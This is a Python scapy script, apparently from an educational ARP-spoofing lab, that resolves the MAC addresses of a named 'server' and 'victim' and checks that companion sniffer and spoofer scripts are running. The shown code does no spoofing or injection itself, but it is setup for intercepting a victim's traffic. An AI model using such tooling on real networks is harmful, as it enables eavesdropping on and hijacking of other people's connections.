# DISCLAIMER:
# This script demonstrates how to sniff, hijack, and inject network traffic.
# The purpose of this script is to practice and understand network security concepts.
# It can be used to learn how to hijack, sniff and inject traffic based on a certain scenario.
# This script is intended solely for educational purposes and should only be used
# in a controlled environment with explicit permission. Unauthorized use of this script
# on networks or systems you do not own or have permission to test is illegal and unethical.

from scapy.all import Ether, ARP, srp, send, IP, TCP, Raw, sr1
from time import sleep
import threading
import psutil
import os
import subprocess

# Define a function to get my own MAC address.
def get_my_mac_address(interface_name):
    # Get a dictionary of all the network interfaces on the computer.
    interfaces = psutil.net_if_addrs()

    if interface_name in interfaces:
        # Iterates through the list of addresses associated with this interface.
        for addr in interfaces[interface_name]:
            # Check MAC address family.
            if addr.family == psutil.AF_LINK:
                return addr.address
    else:
        return None

# Define a function to get the MAC address of a given IP.
def get_mac(dst_ip, operation, interface, src_mac):

    try:
        # Craft an ARP request packet.
        arp_request = ARP(pdst = dst_ip, op = operation)
        ether_frame = Ether(src = src_mac, dst = "FF:FF:FF:FF:FF:FF")
        arp_packet = ether_frame / arp_request

        # Send the packet and receive the response.
        responses, unanswered = srp(arp_packet, timeout = 2, retry = 1, verbose=False, iface = interface)
            
        if responses:
            return responses[0][1].hwsrc

        else:
            return None

    except Exception as e:
        print(f"An error occurred while getting the MAC address for {dst_ip}: {e}")
        return None

# Define a function to check if any instances of a given script are running or not.
def is_running(script_name):
    try:
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
        process_list = result.stdout.strip().split('\n')

        # Debugging: Print the list of processes
        #for process in process_list:
        #    print(process)

        # Check if any line in the process list contains the script name.
        for process in process_list:
            if script_name in process:
                return True

        return False

    except Exception as e:
        print(f"An error occurred while checking if {script_name} is running: {e}")
        return False

def main():
    interface = "eth0"  # Replace with your network interface name.

    print("\nGetting your mac address ...")
    my_mac_address = get_my_mac_address(interface)

    if not my_mac_address:
        print(f"\nCould not retrieve the MAC address for {interface}.")
        print(f"Aborting...")
        exit(1)
        
    print(f"\nMAC address of {interface}: {my_mac_address}")
    print("Proceeding ...\n")

    # Check wether the sniffer process is running.
    print(f"Checking if sniffer is running ...")
    
    if not is_running('sniffer.py'):
        print("\nNo sniffer is up.")
        print("Fire up sniffer and try again.")
        print("Aborting ...\n")
        exit(1)

    print("\nSniffer is up and running.")
    print("Proceeding ...\n")

    # Define required params.
    operation = 0x01
    src_ip = "10.0.0.2"
    server_ip = "10.0.0.4"
    vic_ip = "10.0.0.3"

    print(f"Getting the server mac address ...\n")
    server_mac = get_mac(server_ip, operation, interface, my_mac_address)

    if not server_mac:
        print(f"Could not get the MAC address for {server_ip}")
        print("Aborting ...\n")
        exit(1)

    print(f"Got the server's MAC address successfully.")
    print(f"({server_ip}, {server_mac})")
    print("Proceeding ...\n")

    print(f"Getting the victim's mac address ...\n")
    vic_mac = get_mac(vic_ip, operation, interface, my_mac_address)

    if not vic_mac:
        print(f"Could not get the MAC address for {vic_ip}")
        print("Aborting ...\n")
        exit(1)

    print(f"Got the victim's MAC address successfully.")
    print(f"({vic_ip}, {vic_mac})")
    print("Proceeding ...\n")

    # Check wether the spoofer process is running.
    print(f"Checking if spoofer is running ...")
    
    if not is_running('spoofer.py'):
        print("\nNo spoofer is up.")
        print("Fire up spoofer and try again.")
        print("Aborting ...\n")
        exit(1)

    print("\nSpoofer is up and running.")
    print("Proceeding ...\n")
    
if __name__ == "__main__":
    main()
